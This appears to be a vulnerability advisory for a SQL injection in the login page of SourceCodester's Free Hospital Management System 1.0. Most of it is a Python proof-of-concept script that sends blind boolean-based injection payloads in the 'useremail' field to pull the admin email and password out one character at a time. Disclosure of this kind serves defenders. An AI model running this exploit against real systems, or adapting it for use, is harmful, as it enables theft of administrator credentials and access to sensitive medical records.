# SourceCodester Free Hospital Management System for Small Practices 1.0 has a SQL Injection vulnerability in /vm/login.php
## Software
- Software: Free Hospital Management System for Small Practices 1.0
- Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html
- Vulnerability Type: SQL Injection
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description
SourceCodester Free Hospital Management System for Small Practices 1.0 has a SQL Injection vulnerability in /vm/login.php. Affected is file `/vm/login.php`,The manipulation of the argument `useremail` or `userpassword` leads to SQL inject.Attackers can leverage blind boolean-based SQL injection to extract data from the database.

## Vulnerability Code
- /vm/login.php
![Vuln_code](https://github.com/Yesec/Free-Hospital-Management-System-for-Small-Practices/assets/19534204/3cd74cda-ecfb-4dad-819d-37792c3d0118)


## POC

```python
import requests
import string

url = "http://localhost/vm/login.php"
res = ""
dict = string.digits + string.ascii_lowercase + string.punctuation

for i in range(1,50):
    for j in dict:
        # payload = "doctor@doctor.com' and substr(database(),%s,1)='%s'-- " % (i, j)
        payload = "doctor@doctor.com' and substr((select concat(aemail,apassword) from admin),%s,1)='%s'-- " % (i, j)
        data = {"useremail": payload}
        response = requests.post(url, data=data)
        if "We cant found" not in response.text:
            res += j
            print("[*] Found: ",res)
            break
```
![Exploit](https://github.com/Yesec/Free-Hospital-Management-System-for-Small-Practices/assets/19534204/963a9536-8da7-41dc-80f2-f4a9842bdb35)
